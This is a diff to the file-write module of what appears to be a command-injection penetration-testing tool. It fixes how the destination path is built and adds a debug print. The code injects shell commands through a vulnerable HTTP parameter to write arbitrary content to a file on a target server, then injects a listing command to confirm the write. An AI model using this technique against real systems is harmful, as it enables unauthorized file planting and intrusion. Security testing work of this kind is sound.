@@ -59,7 +59,11 @@ def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln
     else:
       sys.stdout.write(colors.BGRED + "\n(x) Error: It seems that '"+ file_to_write + "' is not a file." + colors.RESET)
       sys.stdout.flush()
-    dest_to_write = menu.options.file_dest
+
+    if os.path.split(menu.options.file_dest)[1] == "":
+      dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
+    else:
+      dest_to_write = menu.options.file_dest
     cmd = settings.FILE_WRITE + " '"+ content + "'" + " > " + "'"+ dest_to_write + "'"
     response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
     shell = cb_injector.injection_results(response,TAG)
@@ -68,6 +72,7 @@ def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln
     cmd = "echo $(ls " + dest_to_write + ")"
     response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
     shell = cb_injector.injection_results(response,TAG)
+    print shell
     shell = "".join(str(p) for p in shell)
     if shell:
       if menu.options.verbose:
@@ -75,7 +80,7 @@ def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln
       sys.stdout.write(colors.BOLD + "(!) The " + colors.UNDERL + shell + colors.RESET + colors.BOLD +" file was created successfully!\n" + colors.RESET)
       sys.stdout.flush()
     else:
-     sys.stdout.write(colors.BGRED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file.\n" + colors.RESET)
+     sys.stdout.write(colors.BGRED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + colors.RESET)
      sys.stdout.flush()
 
 # eof
